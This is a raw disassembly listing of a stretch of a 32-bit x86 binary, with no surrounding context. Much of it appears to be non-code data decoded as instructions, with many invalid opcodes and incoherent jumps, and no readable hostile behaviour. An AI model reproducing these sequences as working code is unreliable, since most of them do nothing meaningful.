  403738:	mov    ecx,0x88e516bf
  40373d:	mov    esi,0xac1c3343
  403742:	sahf   
  403743:	fdivr  DWORD PTR [ebx+0x1701bbb0]
  403749:	mov    DWORD PTR [edx],eax
  40374b:	xor    al,0xb
  40374d:	sbb    BYTE PTR ds:0xc5a07006,dh
  403753:	jne    0x403795
  403755:	cmp    al,0x9f
  403757:	and    al,0x9a
  403759:	cdq    
  40375a:	push   es
  40375b:	cmp    al,BYTE PTR [edi+0x3c9ad0bd]
  403761:	jecxz  0x40379c
  403763:	rol    DWORD PTR [ecx-0x25],cl
  403766:	jge    0x4037ab
  403768:	mov    ds:0x61710725,al
  40376d:	add    al,0x5d
  40376f:	iret   
  403770:	fsub   QWORD PTR [ebx-0x70]
  403773:	or     ah,BYTE PTR [edi]
  403775:	test   al,0x59
  403777:	cmp    BYTE PTR [ebp-0x39],dh
  40377a:	xchg   ebp,eax
  40377b:	mov    cl,0x61
  40377d:	add    BYTE PTR [ebx-0xa],bl
  403780:	xor    BYTE PTR [edi-0x3f08ccbc],al
  403786:	xor    BYTE PTR [edi],cl
  403788:	imul   ecx,ebp,0x42
  40378b:	mov    BYTE PTR [ebx+0x57859173],0xf0
  403792:	cmp    BYTE PTR [esp+ebx*8+0x5a99dbe8],bl
  403799:	popw   ss
  40379b:	cmp    eax,DWORD PTR ds:0x36f9753a
  4037a1:	and    bh,BYTE PTR [ecx+ebx*2-0x5acd1df9]
  4037a8:	xor    BYTE PTR [eax],cl
  4037aa:	(bad)  
  4037ab:	(bad)  
  4037ac:	push   cs
  4037ad:	and    al,0x7a
  4037af:	cmp    ebx,DWORD PTR [esi]
  4037b1:	and    esp,DWORD PTR [ecx+ecx*1-0x9aa6645]
  4037b8:	jmp    0x4037c8
  4037ba:	nop
  4037bb:	fcomp  QWORD PTR [edi+edi*1]
  4037be:	and    ecx,eax
  4037c0:	sbb    ebp,DWORD PTR [edi+0x28b5b95]
  4037c6:	call   DWORD PTR [eax+0x8]
  4037c9:	add    al,0x6c
  4037cb:	test   al,0x3b
  4037cd:	adc    eax,0x52027319
  4037d2:	mov    ds:0x5fb12c00,al
  4037d7:	pop    eax
  4037d8:	jo     0x403769
  4037da:	xor    al,0x7b
  4037dc:	adc    esi,ebp
  4037de:	sub    eax,0x51018b00
  4037e3:	and    al,dl
  4037e5:	xchg   esp,eax
  4037e6:	inc    esi
  4037e7:	or     DWORD PTR [eax],ecx
  4037e9:	jbe    0x40385f
  4037eb:	push   es
  4037ec:	push   cs
  4037ed:	es dec edi
  4037ef:	sub    BYTE PTR [esi-0x2c93c8f6],bh
  4037f5:	add    BYTE PTR [edi],0x55
  4037f8:	test   al,0x27
  4037fa:	dec    esp
  4037fb:	add    bh,bh
  4037fd:	and    eax,esp
  4037ff:	ja     0x4037a3
  403801:	jo     0x403783
  403803:	dec    ecx
  403804:	pop    ss
  403805:	iret   
  403806:	cmp    ecx,edx
  403808:	xchg   DWORD PTR [edx-0x15],esp
  40380b:	pop    ebx
  40380c:	adc    BYTE PTR [edx-0x3dd16f4],bl
  403812:	rcl    BYTE PTR [esi-0x50],0x1
  403816:	rol    BYTE PTR ds:0x30808bb8,0x17
  40381d:	adc    DWORD PTR [esi],ebp
  40381f:	lods   al,BYTE PTR ds:[esi]
  403820:	or     al,0x0
  403822:	sbb    ebx,DWORD PTR [esi]
  403824:	pop    ecx
  403825:	mov    eax,0x64e2b042
  40382a:	(bad)  
  40382b:	cwde   
  40382c:	cmp    al,0x7c
  40382e:	adc    cl,al
  403830:	or     dh,bl
  403832:	outs   dx,DWORD PTR ds:[esi]
  403833:	ret    
  403834:	or     DWORD PTR [eax+0x210b043],ecx
  40383a:	ret    
  40383b:	add    al,0xa
  40383d:	or     eax,0x28a639e1
  403842:	ret    
  403843:	(bad)  
  403844:	sbb    cl,BYTE PTR [ecx]
  403846:	pop    edx
  403847:	push   ss
  403848:	pop    esp
  403849:	push   ebp
  40384a:	shl    BYTE PTR [eax-0x4becab48],cl
  403850:	clc    
  403851:	xchg   edi,eax
  403852:	test   BYTE PTR [edi-0x15a78af],0x6f
  403859:	mov    dh,bl
  40385b:	sbb    al,0xf
  40385d:	mov    bh,0x14
  40385f:	dec    edx
  403860:	inc    ecx
  403861:	cmp    edx,0x7f
  403864:	ja     0x40386c
  403866:	mov    BYTE PTR [esi-0x7d905e9],cl
  40386c:	inc    esi
  40386d:	jmp    0x4038c8
  40386f:	cmp    edx,0x8d3176d5
  403875:	pop    esi
  403876:	add    ebp,DWORD PTR [esi]
  403878:	cld    
  403879:	ja     0x4038ea
  40387b:	(bad)  
  40387c:	(bad)  
  40387d:	outs   dx,DWORD PTR ds:[esi]
  40387e:	stos   BYTE PTR es:[edi],al
  40387f:	fcmovb st,st(1)
  403881:	jmp    0x40388f
  403883:	or     bl,0xe0
  403886:	mov    BYTE PTR [eax+esi*1],bl
  403889:	or     al,BYTE PTR [esi]
  40388b:	and    bl,0x3f
  40388e:	or     eax,0x885c8880
  403893:	xchg   edi,eax
  403894:	in     eax,dx
  403895:	push   edx
  403896:	mov    edx,0xca09e280
  40389b:	push   esp
  40389c:	xor    BYTE PTR [edx],al
  40389e:	retf   
  40389f:	rep ins BYTE PTR es:[edi],dx
  4038a1:	xchg   edi,eax
  4038a2:	jmp    0x622:0x23020eb
  4038a9:	sar    ah,0x56
  4038ac:	xor    esp,DWORD PTR es:[ecx]
  4038af:	add    DWORD PTR [ecx*2+0x3b057308],ebx
  4038b6:	sbb    ebp,DWORD PTR ds:0x72964bbf
  4038bc:	mov    al,BYTE PTR [esp+eax*1]
  4038bf:	mov    ecx,DWORD PTR [esi-0x18]
  4038c2:	xor    BYTE PTR [ebp-0x42],bh
  4038c5:	imul   BYTE PTR [ebp-0x7c]
  4038c8:	and    bl,BYTE PTR [eax]
  4038ca:	sbb    eax,0x764889ea
  4038cf:	or     bl,al
  4038d1:	fidiv  WORD PTR [ebp+0x46018383]
  4038d7:	add    BYTE PTR [edx+esi*2],bl
  4038da:	jecxz  0x403869
  4038dc:	push   esi
  4038dd:	loopne 0x4038a1
  4038df:	shr    eax,0x4c
  4038e2:	test   BYTE PTR [ebx-0x25],0xf0
  4038e6:	mov    dl,0xcb
  4038e8:	dec    eax
  4038e9:	inc    ebp
  4038ea:	inc    ebx
  4038eb:	pop    ecx
  4038ec:	add    BYTE PTR [eax-0x10],ah
  4038ef:	inc    ebp
  4038f0:	(bad)  
  4038f1:	ds add dl,bl
  4038f4:	mov    WORD PTR [edi],0xc024
  4038f9:	jmp    0x4038f2
  4038fb:	xor    BYTE PTR [esi+0xf],0xcc
  4038ff:	cld    
  403900:	jmp    0xff5a:0xdef94419
  403907:	(bad)  
  403908:	dec    edi
  403909:	std    
  40390a:	mov    cl,BYTE PTR [edx+esi*1]
  40390d:	inc    esi
  40390e:	test   cl,0x80
  403911:	push   ebp
  403912:	xchg   BYTE PTR [eax],cl
  403914:	jae    0xaf1807
  40391a:	sbb    al,0x83
  40391c:	loope  0x40395d
  40391e:	adc    BYTE PTR [eax],ah
  403920:	je     0x403950
  403922:	push   ds
  403923:	mov    dl,BYTE PTR [edx+eax*1]
  403926:	pop    ebx
  403927:	ins    BYTE PTR es:[edi],dx
  403928:	lods   eax,DWORD PTR ds:[esi]
  403929:	sbb    al,0xc0
  40392b:	jecxz  0x4038ed
  40392d:	es or  al,0x6a
  403931:	addr16 (bad) 
  403933:	int3   
  403934:	mov    ebx,0x81ccb225
  403939:	loop   0x40398e
  40393b:	mov    dh,0xd5
  40393d:	fwait
  40393e:	cld    
  40393f:	shl    ecx,0x6
  403942:	or     edi,DWORD PTR [ebx-0x5772d236]
  403948:	jle    0x403981
  40394a:	fs and al,0x66
  40394d:	and    eax,0x8966fc4d
  403952:	adc    al,0x41
  403954:	fwait
  403955:	pop    ebx
  403956:	mov    ebx,0x855a4db
  40395b:	or     al,0x42
  40395d:	inc    eax
  40395e:	dec    ebp
  40395f:	jmp    0x40396a
  403961:	cmp    eax,DWORD PTR [edx-0x55840790]
  403967:	jae    0x40390b
  403969:	or     BYTE PTR [edx+0x30],dh
  40396c:	dec    eax
  40396d:	push   ds
  40396e:	mov    DWORD PTR [edx+eax*2],0x6becdb2d
  403975:	xchg   edx,eax
  403976:	inc    edi
  403977:	and    DWORD PTR [edx+0x5b],eax
  40397a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40397b:	ret    0xb30
  40397e:	mov    dl,0x35
  403980:	not    DWORD PTR [eax]
  403982:	xor    eax,0x14a20c57
  403987:	push   cs
  403988:	mov    ebx,0x725befb0
  40398d:	cli    
  40398e:	xor    BYTE PTR [ebp+0x1e],0x1b
  403992:	sbb    DWORD PTR [ebx],edx
  403994:	or     ah,BYTE PTR [ebx+0x18]
  403997:	inc    esi
  403998:	xchg   ebx,eax
  403999:	clc    
  40399a:	jb     0x40395a
  40399c:	inc    eax
  40399d:	push   ebp
  40399e:	ds adc al,0x21
  4039a1:	push   0x98eb77cd
  4039a6:	jno    0x40392a
  4039a8:	inc    ecx
  4039a9:	sahf   
  4039aa:	ins    DWORD PTR es:[edi],dx
  4039ab:	inc    esi
  4039ac:	pop    ss
  4039ad:	(bad)  
  4039ae:	cmp    BYTE PTR [eax+0x77],ch
  4039b1:	inc    ecx
  4039b2:	mov    ds:0xa8032742,eax
  4039b7:	je     0x403a17
  4039b9:	or     dh,BYTE PTR [ebx+0xc2fc4c2]
  4039bf:	lea    edx,[esi+eax*1]
  4039c2:	loopne 0x403a38
  4039c4:	adc    al,0x27
  4039c6:	adc    WORD PTR [ecx+0x41d6cc3b],dx
  4039cd:	into   
  4039ce:	dec    edx
  4039cf:	int3   
  4039d0:	adc    DWORD PTR [ecx+esi*1-0x57a2c044],ecx
  4039d7:	fadd   QWORD PTR [edx-0x6a9fbcc0]
  4039dd:	ror    BYTE PTR [edx-0x40],1
  4039e0:	jne    0x403995
  4039e2:	xchg   DWORD PTR [edi],esi
  4039e4:	jmp    0x4039ee
  4039e6:	or     DWORD PTR [esi-0x3a],ebx
  4039e9:	in     al,0xc
  4039eb:	cmp    esp,DWORD PTR [eax]
  4039ed:	sbb    eax,0x1e46d275
  4039f2:	push   ds
  4039f3:	fld    DWORD PTR [edx+eax*4-0x546877ef]
  4039fa:	push   edi
  4039fb:	or     DWORD PTR [esi-0x213844a4],edx
  403a01:	inc    edi
  403a02:	mov    esp,0x805d5ee6
  403a07:	mov    DWORD PTR [edx+eax*2+0x45],ebp
  403a0b:	aaa    
  403a0c:	cmp    DWORD PTR [eax+0x30],ebx
  403a0f:	adc    BYTE PTR [ebx+0x139a9c34],ah
  403a15:	jb     0x403a03
  403a17:	xor    BYTE PTR [ecx],dl
  403a19:	mov    WORD PTR [ebx-0x7ecac3bc],fs
  403a1f:	pushf  
  403a20:	in     al,0x90
  403a22:	js     0x403a57
  403a24:	xor    ebp,DWORD PTR [ebx+edx*4+0x47]
  403a28:	leave  
  403a29:	leave  
  403a2a:	ret    0x4733
  403a2d:	or     ebx,ebp
  403a2f:	xlat   BYTE PTR ds:[ebx]
  403a30:	(bad)  
  403a31:	jo     0x403a61
  403a33:	xlat   BYTE PTR ds:[ebx]
  403a34:	xor    al,0x7c
  403a36:	adc    dh,0x4f
  403a39:	inc    ebp
  403a3a:	ins    DWORD PTR es:[edi],dx
  403a3b:	sbb    DWORD PTR [eax+edx*4],0x4a124774
  403a42:	sub    DWORD PTR ds:[eax+0x3d3a8114],ebx
  403a49:	cmp    DWORD PTR [ebx+0x27],0x15095b80
  403a50:	and    DWORD PTR [ebp+0x2a],edi
  403a53:	scas   al,BYTE PTR es:[edi]
  403a54:	push   ss
  403a55:	lea    ecx,[edx+0x52]
  403a58:	push   ecx
  403a59:	cmp    edi,DWORD PTR ds:0x3062da89
  403a5f:	adc    al,0xb1
  403a61:	pusha  
  403a62:	enter  0xac7,0xb8
  403a66:	adc    DWORD PTR [eax-0x3a],ebp
  403a69:	sbb    DWORD PTR [edx],ecx
  403a6b:	ror    BYTE PTR [edi+0x1ea5c9a4],0x5
  403a72:	sub    BYTE PTR [edi+0x0],dl
  403a75:	adc    BYTE PTR [edi],ch
  403a77:	inc    eax
  403a78:	test   DWORD PTR [eax+0x29badc10],ebp
  403a7e:	(bad)  
  403a7f:	xchg   ecx,eax
  403a80:	arpl   WORD PTR [ebx+0x47],di
  403a83:	(bad)  
  403a84:	push   0x7
  403a86:	lea    edx,[ebp-0xb]
  403a89:	push   edx
  403a8a:	push   0x9b6ec17b
  403a8f:	test   DWORD PTR [ebx],eax
  403a91:	cwde   
  403a92:	lock adc DWORD PTR [ecx-0x50812ff9],edi
  403a99:	pushf  
  403a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a9b:	das    
  403a9c:	bts    DWORD PTR [eax+ebx*8],ebx
  403aa0:	xchg   edx,eax
  403aa1:	pop    es
  403aa2:	push   esi
  403aa3:	mov    dl,BYTE PTR [edi-0x7b]
  403aa6:	mov    ch,0xca
  403aa8:	fld    QWORD PTR [edx+0x31704244]
  403aae:	mov    esi,0x9e4d143d
  403ab3:	loopne 0x403b28
  403ab5:	adc    ecx,DWORD PTR [eax+0x2e]
  403ab8:	aad    0x67
  403aba:	sub    bh,dh
  403abc:	dec    ecx
  403abd:	mov    ah,0x75
  403abf:	and    edi,DWORD PTR [eax-0x129fafa8]
  403ac5:	and    cl,BYTE PTR [edi]
  403ac7:	jnp    0x403b01
  403ac9:	or     DWORD PTR [ebx-0x20],edx
  403acc:	add    al,0xb
  403ace:	enter  0x186d,0xec
  403ad2:	sbb    BYTE PTR [edi+0x48],0x35
  403ad6:	push   edi
  403ad7:	clc    
  403ad8:	pop    ds
  403ad9:	sub    DWORD PTR ds:0xf4b341f8,0x42
  403ae0:	add    DWORD PTR [ebp+eax*8+0x20806c6],ecx
  403ae7:	xchg   ebx,eax
  403ae8:	pop    edi
  403ae9:	add    BYTE PTR [ecx],al
  403aeb:	mov    bl,0x1a
  403aed:	push   eax
  403aee:	inc    esi
  403aef:	iret   
  403af0:	pop    esp
  403af1:	xor    BYTE PTR [esi+0x29],0x39
  403af5:	xor    BYTE PTR [ebx+0x20],cl
  403af8:	mov    ah,0x8
  403afa:	mov    cl,0xc7
  403afc:	sahf   
  403afd:	and    ah,0x80
  403b00:	sbb    ax,0xb04c
  403b04:	xlat   BYTE PTR ds:[ebx]
  403b05:	or     al,al
  403b07:	inc    ebx
  403b08:	cmp    eax,ecx
  403b0a:	push   edx
  403b0b:	sbb    BYTE PTR [ebx-0x1c],dl
  403b0e:	or     BYTE PTR [eax+esi*8-0x1df28987],dh
  403b15:	cmp    al,0x9
  403b17:	add    al,BYTE PTR [eax+edi*1-0x4132da84]
  403b1e:	mov    al,ds:0x2d3fda13
  403b23:	adc    BYTE PTR [esi-0x4c],al
  403b26:	adc    DWORD PTR ds:0x769366e7,edi
  403b2c:	pop    edi
  403b2d:	add    BYTE PTR [eax+ebp*4+0x39],al
  403b31:	mov    eax,0xf9532003
  403b36:	inc    edx
  403b37:	neg    bl
  403b39:	imul   BYTE PTR [ebx+eiz*4+0x14]
  403b3d:	jmp    0x403b4e
  403b3f:	adc    BYTE PTR [esi+0x74],dl
  403b42:	push   ss
  403b43:	js     0x403b56
  403b45:	in     eax,dx
  403b46:	xor    bl,dl
  403b48:	pop    ebx
  403b49:	out    0xc0,al
  403b4b:	pusha  
  403b4c:	nop
  403b4d:	inc    ecx
  403b4e:	mov    BYTE PTR [edi],0xe8
  403b51:	in     al,0xe0
  403b53:	jge    0x403b45
  403b55:	test   eax,0xc16af3ad
  403b5a:	dec    ecx
  403b5b:	adc    BYTE PTR [edi],dh
  403b5d:	mov    eax,0x11c80418
  403b62:	dec    edi
  403b63:	stos   DWORD PTR es:[edi],eax
  403b64:	xor    al,0x42
  403b66:	lock and eax,esi
  403b69:	and    dh,BYTE PTR [esi]
  403b6b:	inc    ebx
  403b6c:	cwde   
  403b6d:	jmp    esp
  403b6f:	add    BYTE PTR [ebx+eiz*1],bl
  403b72:	enter  0xf3e2,0x49
  403b76:	sub    BYTE PTR [ebp+0x17],bh
  403b79:	pop    eax
  403b7a:	mov    dh,0xef
  403b7c:	or     al,0x14
  403b7e:	rcl    DWORD PTR [eax-0x5f],0x29
  403b82:	push   eax
  403b83:	pop    eax
  403b84:	adc    esi,DWORD PTR [ebp+0x14201bf1]
  403b8a:	mov    bl,BYTE PTR [ebx-0x69d3eda4]
  403b90:	mov    eax,0x26d584c1
  403b95:	fs xchg edi,eax
  403b97:	sub    al,0x17
  403b99:	cmp    BYTE PTR [edx+0x3c826c6c],bh
  403b9f:	cmp    al,0x2b
  403ba1:	sbb    BYTE PTR [eax-0x6d],ch
  403ba4:	in     eax,dx
  403ba5:	add    bl,BYTE PTR [edx]
  403ba7:	hlt    
  403ba8:	and    BYTE PTR [eax-0x3d],ch
  403bab:	adc    bl,bl
  403bad:	and    al,bh
  403baf:	adc    ebx,ebp
  403bb1:	ret    
  403bb2:	mov    eax,0xf89f9c20
  403bb7:	mov    bh,0x2
  403bb9:	inc    esi
  403bba:	jmp    0xb349:0x5c31cdbd
  403bc1:	mov    bl,0xef
  403bc3:	sti    
  403bc4:	pop    ecx
  403bc5:	pusha  
  403bc6:	xor    ah,BYTE PTR [eax+0x15]
  403bc9:	mov    al,ds:0x5806a41c
  403bce:	sbb    al,0x7b
  403bd0:	mov    edi,0xbac021a8
  403bd5:	ds test al,0x2a
  403bd8:	xchg   esp,eax
  403bd9:	jae    0x403b67
  403bdb:	xchg   edi,eax
  403bdc:	cmp    al,0x63
  403bde:	das    
  403bdf:	dec    edx
  403be0:	cmp    DWORD PTR [esi+0x64],edx
  403be3:	or     ch,BYTE PTR [edi+0x4a072589]
  403be9:	inc    eax
  403bea:	arpl   WORD PTR ds:0x2e40641e,bp
  403bf0:	imul   ebx,DWORD PTR [eax+0x46c7137],0x65
  403bf7:	dec    edx
  403bf8:	push   cs
  403bf9:	js     0x403c67
  403bfb:	sbb    DWORD PTR [ebx+edi*1+0x762cb5d],esp
  403c02:	jl     0x403c7c
  403c04:	fs nop
  403c06:	inc    ecx
  403c07:	push   es
  403c08:	je     0x403c7a
  403c0a:	ins    BYTE PTR es:[edi],dx
  403c0b:	nop
  403c0c:	inc    ecx
  403c0d:	push   es
  403c0e:	sbb    DWORD PTR [eax+0x64],ebp
  403c11:	pusha  
  403c12:	inc    ecx
  403c13:	push   es
  403c14:	sbb    DWORD PTR [esp+ebx*2+0x58],esp
  403c18:	push   esp
  403c19:	push   es
  403c1a:	sbb    DWORD PTR [eax+edx*4+0x50],esp
  403c1e:	dec    esp
  403c1f:	dec    eax
  403c20:	inc    esp
  403c21:	sbb    DWORD PTR [eax+edx*4+0x41],esp
  403c25:	inc    eax
  403c26:	cmp    al,0x38
  403c28:	fs nop
  403c2a:	inc    ecx
  403c2b:	push   es
  403c2c:	xor    al,0x30
  403c2e:	sub    al,0x90
  403c30:	inc    ecx
  403c31:	push   es
  403c32:	sbb    DWORD PTR [eax],ebp
  403c34:	and    al,0x20
  403c36:	inc    ecx
  403c37:	push   es
  403c38:	sbb    DWORD PTR [esp+ebx*1+0x18],esp
  403c3c:	adc    al,0x6
  403c3e:	sbb    DWORD PTR [eax+edx*4+0x10],esp
  403c42:	or     al,0x8
  403c44:	add    al,0x32
  403c46:	enter  0x4193,0x0
  403c4a:	popa   
  403c4b:	cld    
  403c4c:	clc    
  403c4d:	nop
  403c4e:	inc    ecx
  403c4f:	sahf   
  403c50:	or     al,0xf4
  403c52:	(bad)  
  403c53:	ror    ah,1
  403c55:	inc    ecx
  403c56:	push   es
  403c57:	sbb    DWORD PTR [eax+ecx*8-0x3c],esp
  403c5b:	rol    BYTE PTR [esi],0x19
  403c5e:	fs nop
  403c60:	mov    esp,0x19b0b4b8
  403c65:	fs nop
  403c67:	inc    ecx
  403c68:	lods   al,BYTE PTR ds:[esi]
  403c69:	test   al,0xa4
  403c6b:	fs nop
  403c6d:	inc    ecx
  403c6e:	push   es
  403c6f:	mov    al,ds:0x4190989c
  403c74:	push   es
  403c75:	sbb    DWORD PTR [eax+edx*4+0x1906418c],edx
  403c7c:	fs mov al,bh
  403c7f:	hlt    
  403c80:	push   es
  403c81:	sbb    DWORD PTR [eax+edx*4-0x4],esp
  403c85:	lock in al,dx
  403c87:	call   0x41d0a0a5
  403c8c:	in     al,0xe0
  403c8e:	fcom   QWORD PTR [eax-0x27f9ae6d]
  403c94:	aas    
  403c95:	dec    esp
  403c96:	mov    cl,0x4c
  403c98:	leave  
  403c99:	add    DWORD PTR [ecx],ebx
  403c9b:	jo     0x403ce9
  403c9d:	mov    eax,0xe9dd2070
  403ca2:	mov    ds:0x7fef0dc,eax
  403ca7:	icebp  
  403ca8:	or     DWORD PTR [edx+esi*1],0xffffffc8
  403cac:	repnz repz hlt 
  403caf:	cmc    
  403cb0:	or     al,0x32
  403cb2:	enter  0xf620,0xf7
  403cb6:	clc    
  403cb7:	xor    cl,al
  403cb9:	and    BYTE PTR [ebx-0x37040507],al
  403cbf:	and    BYTE PTR [ebx-0x10203f4],al
  403cc5:	and    BYTE PTR [ebx-0x1f00cdf4],al
  403ccb:	loope  0x403c50
  403ccd:	or     al,0x32
  403ccf:	enter  0xe3e2,0xe4
  403cd3:	in     eax,0xa
  403cd5:	xor    cl,al
  403cd7:	and    dh,ah
  403cd9:	out    0x20,eax
  403cdb:	pop    ebp
  403cdc:	shr    DWORD PTR [ebp+0x7d],cl
  403cdf:	dec    esi
  403ce0:	mov    BYTE PTR [edi],al
  403ce2:	jmp    0x842a5477
  403ce7:	or     al,0x32
  403ce9:	fsubr  st,st(3)
  403ceb:	pop    es
  403cec:	in     al,dx
  403ced:	in     eax,dx
  403cee:	out    dx,al
  403cef:	or     al,0x32
  403cf1:	enter  0xef20,0xd0
  403cf5:	shl    DWORD PTR [edx],1
  403cf7:	enter  0x8320,0xd2
  403cfb:	rcl    esp,cl
  403cfd:	enter  0x8320,0xc
  403d01:	aad    0xd6
  403d03:	xlat   BYTE PTR ds:[ebx]
  403d04:	sub    DWORD PTR [ebx-0x2627cdf4],eax
  403d0a:	ficom  DWORD PTR [eax-0x24e6f9bf]
  403d10:	(bad)  
  403d12:	inc    ecx
  403d13:	push   es
  403d14:	sbb    DWORD PTR [esi+ebx*8-0x21],esp
  403d18:	rol    BYTE PTR [esi],0x19
  403d1b:	fs nop
  403d1d:	rol    edx,0xc3
  403d20:	les    ebx,FWORD PTR [ecx]
  403d22:	fs nop
  403d24:	inc    ecx
  403d25:	(bad)
  403d28:	fs nop
  403d2a:	inc    ecx
  403d2b:	push   es
  403d2c:	enter  0xcac9,0x90
  403d30:	inc    ecx
  403d31:	push   es
  403d32:	sbb    ebx,ecx
  403d34:	int3   
  403d35:	int    0x41
  403d37:	push   es
  403d38:	sbb    DWORD PTR [esi+ecx*8-0x31],esp
  403d3c:	mov    al,0x6
  403d3e:	sbb    DWORD PTR [eax+edx*4-0x4f],esp
  403d42:	mov    dl,0xb3
  403d44:	mov    ah,0x19
  403d46:	fs nop
  403d48:	inc    ecx
  403d49:	mov    ch,0xb6
  403d4b:	mov    bh,0x64
  403d4d:	nop
  403d4e:	inc    ecx
  403d4f:	push   es
  403d50:	mov    eax,0x4190bab9
  403d55:	push   es
  403d56:	sbb    DWORD PTR [ebx+0x641bdbc],edi
  403d5c:	sbb    DWORD PTR [esi+edi*4-0x41],esp
  403d60:	mov    al,ds:0x90641906
  403d65:	mov    eax,ds:0x19a4a3a2
  403d6a:	fs nop
  403d6c:	inc    ecx
  403d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d70:	and    al,0x99
  403d72:	inc    ecx
  403d73:	push   es
  403d74:	test   al,0xa9
  403d76:	pop    es
  403d77:	jb     0x403db9
  403d79:	push   es
  403d7a:	in     al,0x4f
  403d7c:	mov    ecx,0x20c04f74
  403d81:	mov    dh,0x30
  403d83:	push   ebx
  403d84:	je     0x403dbe
  403d86:	sbb    al,cl
  403d88:	push   ebx
  403d89:	jb     0x403d1d
  403d8b:	mov    edi,0x2a501850
  403d90:	or     al,0x20
  403d92:	arpl   WORD PTR [ebx-0x37],ax
  403d95:	or     al,0xe
  403d97:	aaa    
  403d98:	add    DWORD PTR [ebx+ebx*4-0x1],esp
  403d9c:	fld    QWORD PTR [edi+eax*2]
  403d9f:	or     DWORD PTR [ebp+0x78],eax
  403da2:	arpl   WORD PTR [ebp+0x70],sp
  403da5:	je     0x403e10
  403da7:	outs   dx,DWORD PTR ds:[esi]
  403da8:	outs   dx,BYTE PTR ds:[esi]
  403da9:	add    BYTE PTR [eax],0x0
  403dac:	adc    eax,0x1f4b6c72
  403db1:	adc    BYTE PTR [edi+0x4f],ah
  403db4:	int3   
  403db5:	mov    edx,0x94e47ec9
  403dba:	inc    esp
  403dbb:	inc    ebp
  403dbc:	dec    eax
  403dbd:	gs popa 
  403dbf:	jo     0x403e1b
  403dc1:	nop
  403dc2:	pop    ebx
  403dc3:	fcom   QWORD PTR [esp+edi*1+0x50dc4a19]
  403dca:	xor    al,0x37
  403dcc:	pop    es
  403dcd:	(bad)  
  403dce:	jg     0x403ddc
  403dd0:	inc    ebp
  403dd1:	dec    edi
  403dd2:	jne    0x403e48
  403dd4:	dec    edi
  403dd5:	dec    bp
  403dd7:	gs ins DWORD PTR es:[edi],dx
  403dd9:	outs   dx,DWORD PTR ds:[esi]
  403dda:	jb     0x403e55
  403ddc:	xlat   BYTE PTR ds:[ebx]
  403ddd:	mov    bh,0x51
  403ddf:	cmp    BYTE PTR [eax+0x51245e4a],dh
  403de5:	cmp    dl,dl
  403de7:	mov    ch,0xbb
  403de9:	lahf   
  403dea:	pop    ds
  403deb:	or     eax,DWORD PTR [ebp+0x49]
  403dee:	outs   dx,BYTE PTR ds:[esi]
  403def:	pop    ebp
  403df0:	inc    ebp
  403df1:	jb     0x403e65
  403df3:	pop    ebx
  403df4:	push   edi
  403df5:	nop
  403df6:	test   DWORD PTR [ecx],edx
  403df8:	enter  0x9050,0x65
  403dfc:	or     DWORD PTR [edx+0x740b0b14],esp
  403e02:	push   ebx
  403e03:	mov    bl,0xb
  403e05:	fs mov ebx,0x5116379c
  403e0b:	mov    al,ds:0x8e491f57
  403e10:	mov    dl,0xee
  403e12:	rol    BYTE PTR [edi],1
  403e14:	inc    esp
  403e15:	push   edi
  403e16:	adc    bh,BYTE PTR [eax+ecx*8+0x526b081e]
  403e1d:	dec    eax
  403e1e:	mov    bh,0x52
  403e20:	dec    eax
  403e21:	and    cl,0x2a
  403e24:	fwait
  403e25:	pop    edi
  403e26:	or     DWORD PTR [edi],ecx
  403e28:	or     eax,0x6e6c9432
  403e2d:	mov    bh,0x57
  403e2f:	mov    al,ds:0x947ffea0
  403e34:	or     al,0xfc
  403e36:	or     al,BYTE PTR [ebp+0x44]
  403e39:	imul   esi,DWORD PTR [esi+0x42],0x72655a79
  403e40:	outs   dx,DWORD PTR ds:[esi]
  403e41:	nop
  403e42:	or     BYTE PTR [eax+ebp*1+0x69],ah
  403e46:	clc    
  403e47:	clc    
  403e48:	mov    dl,0x83
  403e4a:	cld    
  403e4b:	ret    0x52bf
  403e4e:	popa   
  403e4f:	outs   dx,BYTE PTR ds:[esi]
  403e50:	addr16 gs push ebx
  403e53:	push   eax
  403e54:	push   edi
  403e55:	aaa    
  403e56:	inc    esi
  403e57:	and    BYTE PTR [edi],ch
  403e59:	push   ebx
  403e5a:	push   eax
  403e5b:	jae    0x403ea6
  403e5d:	outs   dx,BYTE PTR ds:[esi]
  403e5e:	dec    edx
  403e5f:	mov    dh,0xf3
  403e61:	das    
  403e62:	jbe    0x403ec9
  403e64:	jb     0x403ecc
  403e66:	ins    BYTE PTR es:[edi],dx
  403e67:	outs   dx,DWORD PTR ds:[esi]
  403e68:	ja     0x403ec5
  403e6a:	lods   al,BYTE PTR ds:[esi]
  403e6b:	sub    eax,0xac18408c
  403e70:	arpl   WORD PTR [ebx],cx
  403e72:	dec    ebp
  403e73:	and    al,0xb7
  403e75:	mov    cl,0x2
  403e77:	push   esi
  403e78:	mov    dl,0x90
  403e7a:	push   edi
  403e7b:	push   esp
  403e7c:	add    al,0x5b
  403e7e:	and    eax,0x4545e4f
  403e83:	push   ebx
  403e84:	pusha  
  403e85:	mov    bl,0x50
  403e87:	bnd jge 0x403eed
  403e8a:	jbe    0x403ea4
  403e8c:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x850e5c57
  403e94:	adc    eax,ecx
  403e96:	pop    esp
  403e97:	arpl   WORD PTR [esi+0x19b74943],si
  403e9d:	mov    edi,0xb4576559
  403ea2:	mov    ah,0x21
  403ea4:	xor    al,0x46
  403ea6:	and    BYTE PTR [ebx+0x60],ch
  403ea9:	in     al,0x45
  403eab:	ret    0x6b8f
  403eae:	push   ebp
  403eaf:	or     al,0x7
  403eb1:	push   ebp
  403eb2:	or     al,0xa4
  403eb4:	cmp    edi,ebx
  403eb6:	or     dl,BYTE PTR [ebp+0x6e]
  403eb9:	fs pop eax
  403ebb:	nop
  403ebc:	push   edi
  403ebd:	fs loope 0x403ec8
  403ec0:	lods   al,BYTE PTR ds:[esi]
  403ec1:	mov    eax,ds:0x5f0f8764
  403ec6:	je     0x403e76
  403ec8:	mov    BYTE PTR [edi],cl
  403eca:	push   eax
  403ecb:	outs   dx,DWORD PTR ds:[esi]
  403ecc:	imul   esp,DWORD PTR [eax],0xc086c05b
  403ed2:	cmp    dl,BYTE PTR [eax+eax*8-0x37f3d0f4]
  403ed9:	mov    ?,ecx
  403edb:	ret    
  403edc:	pop    ebx
